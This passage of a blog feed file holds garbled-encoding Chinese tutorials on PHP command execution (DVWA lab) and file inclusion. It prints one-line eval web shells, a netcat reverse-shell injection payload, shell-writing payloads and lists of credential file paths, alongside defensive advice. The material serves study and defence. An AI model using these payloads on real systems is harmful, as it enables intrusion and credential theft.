çš„æƒ…å†µä¸‹å¯¹ååºåˆ—åŒ–æ¼æ´æ”»å‡»å®ç°æ‹¦æˆªã€‚</p></li></ol><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://paper.seebug.org/680/">åˆ©ç”¨ phar æ‹“å±• php ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢</a></p><p>[2] <a href="https://www.freebuf.com/column/198945.html">PHPååºåˆ—åŒ–å…¥é—¨ä¹‹phar</a></p><p>[3] <a href="https://zhuanlan.zhihu.com/p/157910790">é€šè¿‡ååºåˆ—åŒ–æ¼æ´ï¼Œé»‘å®¢èƒ½åšä»€ä¹ˆå‘¢ï¼Ÿ</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
          <category> ååºåˆ—åŒ– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤æ‰§è¡Œæ¼æ´å­¦ä¹ </title>
      <link href="posts/4134.html"/>
      <url>posts/4134.html</url>
      
        <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p><strong>äº§ç”ŸåŸå› ï¼š</strong></p><p>åº”ç”¨æœªå¯¹ç”¨æˆ·è¾“å…¥åšä¸¥æ ¼çš„æ£€æŸ¥è¿‡æ»¤ï¼Œå¯¼è‡´ç”¨æˆ·è¾“å…¥çš„å‚æ•°è¢«å½“æˆå‘½ä»¤æ¥æ‰§è¡Œã€‚</p><p><strong>å±å®³ï¼š</strong></p><ol><li>ç»§æ‰¿WebæœåŠ¡ç¨‹åºçš„æƒé™å»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–è¯»å†™æ–‡ä»¶</li><li>åå¼¹shellï¼Œè·å¾—ç›®æ ‡æœåŠ¡å™¨çš„æƒé™</li><li>è¿›ä¸€æ­¥å†…ç½‘æ¸—é€</li></ol><h1 id="è¿œç¨‹å‘½ä»¤æ‰§è¡Œ"><a href="#è¿œç¨‹å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="è¿œç¨‹å‘½ä»¤æ‰§è¡Œ"></a>è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</h1><p>åœ¨PHPä¸­ï¼Œæœ‰æ—¶å€™éœ€è¦è°ƒç”¨ä¸€äº›æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ï¼Œå¦‚ï¼š<code>eval()</code>ã€<code>assert()</code>ã€<code>preg_replace()</code>ã€<code>create_function()</code>ç­‰ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªä½¿ç”¨è¿™äº›å‡½æ•°ä¸”æœªå¯¹å¯è¢«ç”¨æˆ·æ§åˆ¶çš„å‚æ•°è¿›è¡Œæ£€æŸ¥è¿‡æ»¤çš„é¡µé¢ï¼Œé‚£ä¹ˆè¿™ä¸ªé¡µé¢å°±æœ‰å¯èƒ½å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><h2 id="eval-å’Œ-assert-å‡½æ•°"><a href="#eval-å’Œ-assert-å‡½æ•°" class="headerlink" title="eval() å’Œ assert() å‡½æ•°"></a>eval() å’Œ assert() å‡½æ•°</h2><p>eval() å’Œ assert() å‡½æ•°éƒ½å¯ä»¥æ‰§è¡Œå‚æ•°å†…çš„ä»£ç ï¼Œä¸”æ¥å—çš„å‚æ•°ä¸ºå­—ç¬¦ä¸²ã€‚</p><p>æ³¨æ„ï¼ševal() å‡½æ•°ä¼ å…¥çš„å‚æ•°å¿…é¡»ä¸ºPHPä»£ç ï¼Œå³è¦ä»¥åˆ†å·ç»“å°¾ï¼Œè€Œassert() å‡½æ•°ä¸éœ€è¦ä»¥åˆ†å·ç»“å°¾ã€‚</p><p>ä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210530161554120.png" alt="image-20210530161554120"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @assert(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210530161938256.png" alt="image-20210530161938256"></p><h2 id="preg-replace-å‡½æ•°"><a href="#preg-replace-å‡½æ•°" class="headerlink" title="preg_replace å‡½æ•°"></a>preg_replace å‡½æ•°</h2><p>ä½¿ç”¨ï¼špreg_replace(â€˜æ­£åˆ™è§„åˆ™â€™,â€™æ›¿æ¢å­—ç¬¦â€™,â€™ç›®æ ‡å­—ç¬¦â€™)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> preg_replace(<span class="string">&quot;/test/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>],<span class="string">&quot;just test&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210530164938087.png" alt="image-20210530164938087"></p><p>åŸç†ï¼šPCREä¿®é¥°ç¬¦eï¼špreg_replace()åœ¨è¿›è¡Œäº†å¯¹æ›¿æ¢å­—ç¬¦ä¸²çš„åå‘å¼•ç”¨æ›¿æ¢ä¹‹åï¼Œå°†æ›¿æ¢åçš„å­—ç¬¦ä¸²ä½œä¸ºphpä»£ç æ‰§è¡Œï¼ˆevalå‡½æ•°æ–¹å¼ï¼‰ï¼Œå¹¶ä½¿ç”¨æ‰§è¡Œç»“æœä½œä¸ºå®é™…å‚ä¸æ›¿æ¢çš„å­—ç¬¦ä¸²ã€‚</p><blockquote><p>æ³¨æ„ï¼šphp5.5åï¼Œ/eä¿®é¥°ç¬¦å·²ç»è¢«å¼ƒç”¨ï¼</p></blockquote><h2 id="array-map-å‡½æ•°"><a href="#array-map-å‡½æ•°" class="headerlink" title="array_map()å‡½æ•°"></a>array_map()å‡½æ•°</h2><p>å°†ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ä½œç”¨åˆ°æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¸Šï¼Œå¹¶è¿”å›ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ä½œç”¨åçš„å¸¦æœ‰æ–°å€¼çš„æ•°ç»„ã€‚</p><p>ä¾‹å­(é«˜ç‰ˆæœ¬çš„phpå¯èƒ½ä¸é€‚ç”¨)ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="variable">$new_array</span>=array_map(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new_array</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210530170647764.png" alt="image-20210530170647764"></p><p>ç±»ä¼¼å‡½æ•°ï¼š</p><ul><li>create_function()</li><li>call_user_func()</li><li>all_user_func_array()</li><li>array_filter()</li><li>uasort()</li></ul><h2 id="åŠ¨æ€å‡½æ•°"><a href="#åŠ¨æ€å‡½æ•°" class="headerlink" title="åŠ¨æ€å‡½æ•°"></a>åŠ¨æ€å‡½æ•°</h2><p>åˆ©ç”¨åŠ¨æ€å‡½æ•°æ‰§è¡Œï¼ŒPHPå‡½æ•°å¯ç›´æ¥ç”±å­—ç¬¦ä¸²æ‹¼æ¥è€Œæˆã€‚</p><p>ä¾‹å­ï¼ˆé«˜ç‰ˆæœ¬PHPä¸é€‚ç”¨ï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210530171952315.png" alt="image-20210530171952315"></p><h1 id="ç³»ç»Ÿï¼ˆæœ¬åœ°ï¼‰å‘½ä»¤æ‰§è¡Œ"><a href="#ç³»ç»Ÿï¼ˆæœ¬åœ°ï¼‰å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ç³»ç»Ÿï¼ˆæœ¬åœ°ï¼‰å‘½ä»¤æ‰§è¡Œ"></a>ç³»ç»Ÿï¼ˆæœ¬åœ°ï¼‰å‘½ä»¤æ‰§è¡Œ</h1><p>åˆ©ç”¨PHP çš„ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå‡½æ•°æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤å¹¶æ‰§è¡Œï¼Œè¿™ç±»å‡½æ•°æœ‰<code>system()</code>ã€<code>exec()</code>ã€<code>shell exec()</code>ã€<code>passthru() </code>ã€<code>penti_exec() </code>ã€<code>popen() </code>ã€<code>proc_pen()</code>ç­‰ï¼Œæ­¤å¤–è¿˜æœ‰åå¼•å·å‘½ä»¤æ‰§è¡Œï¼Œè¿™ç§æ–¹å¼å®é™…ä¸Šæ˜¯è°ƒç”¨shell_exec()å‡½æ•°æ¥æ‰§è¡Œã€‚</p><ul><li>system()ï¼šæ‰§è¡Œå¤–éƒ¨ç¨‹åºï¹å¹¶ä¸”æ˜¾ç¤ºè¾“å‡º</li><li>exec()âˆ¶æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åº</li><li>shell_exec():é€šè¿‡ shellç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›</li><li>passthru() :æ‰§è¡Œunixç³»ç»Ÿå‘½ä»¤å¹¶ä¸”æ˜¾ç¤ºåŸå§‹è¾“å‡º</li><li>pcntl_exec() :åœ¨å½“å‰è¿›ç¨‹ç©ºé—´æ‰§è¡ŒæŒ‡å®šç¨‹åº</li><li>popen():æ‰“å¼€è¿›ç¨‹æ–‡ä»¶æŒ‡é’ˆ</li><li>proc_open():æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œå¹¶ä¸”æ‰“å¼€ç”¨æ¥è¾“å…¥/è¾“å‡ºçš„æ–‡ä»¶æŒ‡é’ˆã€‚</li></ul><p>åå¼•å·å‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = `ls -al`;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210530173408877.png" alt="image-20210530173408877"></p><p><strong>å‘½ä»¤æ‰§è¡Œå¸¸ç”¨è¿æ¥å­—ç¬¦</strong></p><ul><li>cmd1|cmd2:æ— è®ºcmd1æ˜¯å¦æ‰§è¡ŒæˆåŠŸï¼Œcmd2å°†è¢«æ‰§è¡Œ</li><li>cmd1;cmd2:æ— è®ºcmd1æ˜¯å¦æ‰§è¡ŒæˆåŠŸï¼Œcmd2å°†è¢«æ‰§è¡Œ</li><li>cmd1||cmd2:ä»…åœ¨cmd1æ‰§è¡Œå¤±è´¥æ—¶æ‰æ‰§è¡Œcmd2</li><li>cmd1&amp;&amp;cmd2:ä»…åœ¨cmd1æ‰§è¡ŒæˆåŠŸåæ—¶æ‰æ‰§è¡Œcmd2</li></ul><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>é¶åœºï¼šDVWA-Command Injection</p><h2 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h2><p>æœªå¯¹ç”¨æˆ·è¾“å…¥çš„å‚æ•°IPåšä»»ä½•è¿‡æ»¤ï¼Œæ„é€ payloadï¼š127.0.0.1|whoami</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531000905013.png" alt="image-20210531000905013"></p><h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>æ›´å¤šå§¿åŠ¿è§ï¼š<a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">LINUXä¸‹åå¼¹SHELLçš„ç§ç§æ–¹å¼</a></p><p><strong>ncåå¼¹shell</strong></p><p>å…ˆåœ¨attackeræœºå™¨ä¸Šç›‘å¬æŸä¸€ç«¯å£</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531000237919.png" alt="image-20210531000237919"></p><p>åˆ©ç”¨å‘½ä»¤æ‰§è¡Œæ¼æ´åå¼¹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.101.187 6666 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531000306609.png" alt="image-20210531000306609"></p><p>å¯ä»¥çœ‹åˆ°shellæˆåŠŸåå¼¹åˆ°äº†kaliä¸Šé¢ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531000350723.png" alt="image-20210531000350723"></p><h2 id="å†™shell"><a href="#å†™shell" class="headerlink" title="å†™shell"></a>å†™shell</h2><p>payload1:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|echo &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot;&gt;1.php</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531003610100.png" alt="image-20210531003610100"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531003851239.png" alt="image-20210531003851239"></p><p>payload2ï¼ˆåˆ†å·è¢«è¿‡æ»¤æ—¶ï¼‰:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|echo &quot;&lt;?php ($_&#x3D;@$_GET[2]).@$_($_POST[1])?&gt;&quot;&gt;3.php</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531004035590.png" alt="image-20210531004035590"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210531004530326.png" alt="image-20210531004530326"></p><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><p><strong>ç¦ç”¨é«˜å±ç³»ç»Ÿå‡½æ•°</strong></p><p>phpinfo() ã€eval() ã€passthru() ã€chroot()ã€ scandir()ã€chgrp() ã€ chown() ã€ shell_exec() ã€ proc_open()ã€proc_get_status() ã€ ini_alter() ã€ini_alter()ã€ini_restore()ã€dl()ã€ pfsockopen() ã€ openlog() ã€syslog()ã€ readlink()ã€symlink() ã€ popepassthru() ã€stream_socket_server() ã€fsocket() ã€ fsockopen()</p><p>åœ¨phpå®‰è£…ç›®å½•ä¸­æ‰¾åˆ°phpé…ç½®æ–‡ä»¶php.iniï¼Œæ‰¾åˆ°disable_functionsï¼Œåœ¨åé¢æ·»åŠ ç¦ç”¨çš„å‡½æ•°åï¼Œå‡½æ•°åä¹‹é—´ä»¥è‹±æ–‡é€—å·åˆ†éš”</p><p><strong>ä¸¥æ ¼è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦</strong></p><p>ä»å‰é¢çš„ä¾‹å­å¯ä»¥å‘ç°åœ¨åˆ©ç”¨å‘½ä»¤æ‰§è¡Œæ¼æ´æ—¶ä¼šåˆ©ç”¨ä¸€äº›ç‰¹æ®Šçš„è¿æ¥ç¬¦ï¼Œç”¨æ¥æ‹¼æ¥æ‰§è¡Œçš„å‘½ä»¤ã€‚å¯¹æ­¤ï¼Œå¯åˆ›å»ºä»…åŒ…å«å…è®¸çš„å­—ç¬¦æˆ–å‘½ä»¤åˆ—è¡¨çš„ç™½åå•ä»¥éªŒè¯ç”¨æˆ·è¾“å…¥ã€‚</p><p><strong>å¼€å¯safe_mode</strong></p><p>safe_mode : phpå®‰å…¨æ¨¡å¼ï¼Œé€šä¿—çš„è¯´å°±æ˜¯ä»¥å®‰å…¨æ¨¡å¼è¿è¡Œphp</p><p>åœ¨php.iniæ–‡ä»¶é‡Œé¢è®¾ç½®safe_mode = Onå³å¯å¼€å¯</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">LINUXä¸‹åå¼¹SHELLçš„ç§ç§æ–¹å¼</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
          <category> å‘½ä»¤æ‰§è¡Œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶åŒ…å«æ¼æ´å­¦ä¹ </title>
      <link href="posts/38386.html"/>
      <url>posts/38386.html</url>
      
        <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p><strong>ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«ï¼Ÿ</strong></p><p>å°†éœ€è¦é‡å¤è°ƒç”¨çš„å‡½æ•°å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œå¯¹è¯¥æ–‡ä»¶è¿›è¡ŒåŒ…å«æ—¶äº§ç”Ÿçš„æ“ä½œã€‚</p><p><strong>æ¼æ´äº§ç”ŸåŸå› </strong></p><p>æ–‡ä»¶åŒ…å«å‡½æ•°åŠ è½½çš„å‚æ•°æ²¡æœ‰ç»è¿‡è¿‡æ»¤æˆ–ä¸¥æ ¼å®šä¹‰ï¼Œå¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼ŒåŒ…å«å…¶ä»–æ¶æ„æ–‡ä»¶ï¼Œå¯¼è‡´äº†æ‰§è¡Œéé¢„æœŸä»£ç ã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼Œæ”¹å˜URLä¸­filenameçš„å€¼å³å¯æ”¹å˜ä»£ç ä¸­åŒ…å«çš„æ–‡ä»¶ã€‚</p><p><strong>PHPä¸­çš„æ–‡ä»¶åŒ…å«å‡½æ•°</strong></p><ul><li><code>include</code> å‡½æ•°å‡ºç°é”™è¯¯æ—¶ï¼Œä¼šæŠ›å‡ºè­¦å‘Šï¼Œä½†ç¨‹åºä»ç»§ç»­æ‰§è¡Œã€‚</li><li><code>include_once</code> åŒ include ï¼Œä½†ä»…åŒ…å«ä¸€æ¬¡ï¼ˆé¿å…å‡½æ•°é‡å®šä¹‰ï¼Œå˜é‡é‡æ–°èµ‹å€¼ç­‰é—®é¢˜ï¼‰ã€‚</li><li><code>require</code> å‡½æ•°å‡ºç°é”™è¯¯æ—¶ï¼Œä¼šç›´æ¥æŠ¥é”™å¹¶é€€å‡ºç¨‹åºæ‰§è¡Œã€‚</li><li><code>require_once</code> åŒ require ï¼Œä½†ä»…åŒ…å«ä¸€æ¬¡ã€‚</li></ul><h1 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h1><h2 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h2><p>è¢«åŒ…å«çš„æ–‡ä»¶åœ¨æœåŠ¡å™¨æœ¬åœ°</p><p><strong>åŒ…å«æœ¬åœ°æ•æ„Ÿæ–‡ä»¶</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527204155548.png" alt="image-20210527204155548"></p><p>æ•æ„Ÿæ–‡ä»¶é»˜è®¤è·¯å¾„åˆ—ä¸¾ï¼ˆä»¥ä¸‹ç›®å½•éšç³»ç»Ÿç‰ˆæœ¬ä¸åŒè€Œæœ‰å·®å¼‚ï¼‰ï¼š</p><ul><li><p>windowsç³»ç»Ÿ:</p><p>C:\windows\win.ini            //åŸºæœ¬ç³»ç»Ÿé…ç½®æ–‡ä»¶</p><p>C:\boot.ini                      //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</p><p>C:\windows\system32\inetsrv\MetaBase.xml                     //iisé…ç½®æ–‡ä»¶</p><p>C:\windows\repair\same                        //å­˜å‚¨windowsç³»ç»Ÿåˆæ¬¡å®‰è£…å¯†ç </p><p>C:\ProgramFiles\mysql\my.ini                        //mysqlé…ç½®ä¿¡æ¯</p><p>C:\ProgramFiles\mysql\data\mysql\user.MYD                    //mysql rootå¯†ç </p><p>C:\windows\php.ini                             //phpé…ç½®ä¿¡æ¯</p></li><li><p>linux/unixç³»ç»Ÿ:</p><p>/etc/passwd                                   //è´¦æˆ·ä¿¡æ¯<br>/etc/shadow                                  //è´¦æˆ·å¯†ç æ–‡ä»¶<br>/usr/local/app/apache2/conf/httpd.conf                    //Apache2é»˜è®¤é…ç½®æ–‡ä»¶<br>/usr/local/app/apache2/conf/extra/httpd-vhost.conf                     //è™šæ‹Ÿç½‘ç«™é…ç½®<br>/usr/local/app/php5/lib/php.ini                             //phpç›¸å…³é…ç½®<br>/etc/httpd/conf/httpd.conf                          //apacheé…ç½®ä¿¡æ¯<br>/etc/my.conf                               //mysqlé…ç½®æ–‡ä»¶</p></li></ul><p><strong>åŒ…å«ä¸Šä¼ æ–‡ä»¶</strong></p><blockquote><p>åŒ…å«æ–‡ä»¶çš„å†…å®¹åªè¦ç¬¦åˆphpè¯­æ³•éƒ½èƒ½è¢«å½“æˆphpä»£ç è¿›è¡Œæ‰§è¡Œï¼Œæ— å…³åç¼€åæ˜¯ä»€ä¹ˆã€‚</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527203723802.png" alt="image-20210527203723802"></p><h2 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h2><p>è¢«åŒ…å«çš„æ–‡ä»¶åœ¨è¿œç¨‹æœåŠ¡ç«¯</p><blockquote><p>æ¡ä»¶ï¼šphp.iniä¸­è®¾ç½®allow_url_fopen = On(é»˜è®¤)ã€allow_url_include = On ( php5.2åé»˜è®¤ä¸ºoff )</p></blockquote><p><strong>åŒ…å«è¿œç¨‹æ–‡ä»¶</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527210839912.png" alt="image-20210527210839912"></p><p><strong>åŒ…å«è¿œç¨‹shell</strong></p><p>remoteshell.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;&lt;?php eval(\$_POST[&#x27;shell&#x27;]);?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$myfile</span>=fopen(<span class="string">&#x27;test.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;can&#x27;t open the file!&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$payload</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527214700058.png" alt="image-20210527214700058"></p><p>åŒ…å«æ„é€ å¥½çš„æ–‡ä»¶åï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºtest.phpï¼Œå³å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œåˆ©ç”¨ï¼Œåç»­ä¹Ÿå¯ç”¨èœåˆ€è¿›è¡Œè¿æ¥</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527215840715.png" alt="image-20210527215840715"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527215247349.png" alt="image-20210527215247349"></p><h1 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h1><h2 id="åˆ©ç”¨PHPä¼ªåè®®"><a href="#åˆ©ç”¨PHPä¼ªåè®®" class="headerlink" title="åˆ©ç”¨PHPä¼ªåè®®"></a>åˆ©ç”¨PHPä¼ªåè®®</h2><p>ä½•ä¸ºä¼ªåè®®ï¼Ÿç®€å•çš„è¯´ï¼Œå°±æ˜¯è‡ªå·±å®šä¹‰çš„åè®®ï¼Œä¹Ÿåªæœ‰è‡ªå·±çš„è½¯ä»¶æ”¯æŒï¼Œå…¶ä»–è½¯ä»¶éƒ½ä¸è¯†åˆ«çš„åè®®å°±æ˜¯ä¼ªåè®®ã€‚</p><p>åœ¨PHPä¸­ï¼ŒPHPç»™è‡ªå·±å®šä¹‰äº†ä¸€ä¸ªphpä¼ªåè®®ï¼Œä»¥ï¼š<code>php://</code>èµ·å¤´ã€‚</p><p>è‡³äº<code>http://</code>ã€<code>file://</code>è¿™äº›éƒ½ä¸æ˜¯ä¼ªåè®®ï¼Œéƒ½æ˜¯å¤§éƒ¨åˆ†ç³»ç»Ÿ/è½¯ä»¶éƒ½æ”¯æŒçš„åè®®ï¼Œå…±äº«åŒä¸€å¥—åè®®æ ‡å‡†ã€‚</p><p><strong>php://filter</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201001030030448.webp" 